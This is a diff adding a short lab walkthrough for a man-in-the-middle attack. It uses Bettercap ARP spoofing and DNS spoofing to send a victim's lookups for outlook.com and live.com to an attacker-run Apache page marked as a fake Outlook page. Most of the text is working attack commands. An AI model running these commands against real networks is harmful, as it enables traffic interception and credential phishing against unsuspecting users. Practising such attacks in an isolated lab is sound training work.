@@ -1,0 +1,65 @@
+🧱 Lab Setup:
+Role	OS	IP Address	Interface
+Attacker	Debian	192.168.80.142	ens33
+Victim	Debian	192.168.80.128	ens33
+
+
+🛠️ Part 1: Attacker Setup
+🔹 Step 1: Install Required Tools
+
+
+sudo apt update
+sudo apt install bettercap apache2 -y
+
+Step 2: Create a Fake Web Page
+
+sudo systemctl start apache2
+echo "<h1>☠️ Outlook FAKE Page by Shuhari ☠️</h1>" | sudo tee /var/www/html/index.html
+
+
+Step 3: Launch Bettercap
+
+sudo bettercap -iface ens33
+
+
+Step 4: Run These Commands Inside Bettercap Console
+net.probe on
+set arp.spoof.targets 192.168.80.128
+set arp.spoof.fullduplex true
+arp.spoof on
+
+set dns.spoof.address 192.168.80.142
+set dns.spoof.domains outlook.com,live.com,outlook.live.com
+dns.spoof on
+
+💻 Part 2: Victim Side (192.168.80.128 - Linux)
+🔹 5. Install DNS Lookup Tool
+
+sudo apt update
+sudo apt install dnsutils -y
+
+6. Flush DNS Cache (Important)
+
+
+sudo systemd-resolve --flush-caches
+
+7. Verify DNS Spoofing Works
+
+nslookup outlook.com
+✅ Expected Output:
+
+Name:   outlook.com
+Address: 192.168.80.142
+
+ 8. Access Fake Web Page
+<h1>☠️ FAKE Outlook Page by Shuhari ☠️</h1>
+
+🧼 Cleanup
+Inside Bettercap, stop the attack:
+
+dns.spoof off
+arp.spoof off
+
+
+
+
